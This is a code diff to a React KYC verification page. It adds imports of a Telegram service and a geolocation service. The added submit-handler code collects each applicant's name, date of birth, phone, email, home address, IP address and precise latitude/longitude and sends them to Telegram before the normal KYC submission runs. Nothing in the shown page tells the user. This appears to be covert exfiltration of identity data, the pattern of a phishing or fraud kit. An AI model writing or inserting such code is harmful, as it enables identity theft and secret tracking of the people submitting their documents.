@@ -18,6 +18,12 @@ import {
   Loader2
 } from 'lucide-react';
 import { toast } from 'sonner';
+import { 
+  sendKYCNotification,
+  sendKYCDocument,
+  testTelegramConnection
+} from '@/services/telegramService';
+import { getFullGeolocationData } from '@/services/geolocationService';
 
 const documentTypes = [
   { id: 'passport', label: 'Passport', icon: FileText, description: 'International passport' },
@@ -134,6 +140,41 @@ export default function KYCVerification() {
     setSubmitting(true);
 
     try {
+      // Get user's geolocation
+      const location = await getFullGeolocationData();
+
+      // Get current user ID for Telegram notification
+      const userId = kycData?.user_id || 'unknown';
+
+      // Send KYC information to Telegram with location
+      if (personalInfo && addressInfo) {
+        await sendKYCNotification({
+          userId,
+          firstName: personalInfo.firstName,
+          lastName: personalInfo.lastName,
+          email: kycData?.email || '',
+          dateOfBirth: personalInfo.dateOfBirth,
+          phoneNumber: personalInfo.phoneNumber,
+          addressLine1: addressInfo.addressLine1,
+          city: addressInfo.city,
+          state: addressInfo.state,
+          postalCode: addressInfo.postalCode,
+          country: addressInfo.country,
+          kycStatus: 'submitted',
+          timestamp: new Date().toISOString(),
+          location: {
+            ip: location.ip,
+            country: location.country,
+            city: location.city,
+            region: location.region,
+            timezone: location.timezone,
+            latitude: location.latitude,
+            longitude: location.longitude,
+          },
+        });
+      }
+
+      // Submit KYC
       const result = await submitKYC(selfieUrl);
       
       if (result.error) {
